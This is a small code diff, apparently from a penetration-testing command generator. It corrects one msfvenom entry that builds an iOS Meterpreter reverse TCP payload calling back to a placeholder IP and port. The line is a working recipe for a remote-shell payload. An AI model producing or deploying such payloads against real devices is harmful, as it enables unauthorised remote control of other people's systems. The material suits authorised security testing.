@@ -455,7 +455,7 @@ const msfvenomCommands =  withCommandType(
         },
 	{
             "name": "Apple iOS Meterpreter Reverse TCP Inline",
-            "command": "msfvenom -p apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
+            "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
             "meta": ["msfvenom", "apple_ios", "apple_ios", "reverse"]
         },
         {
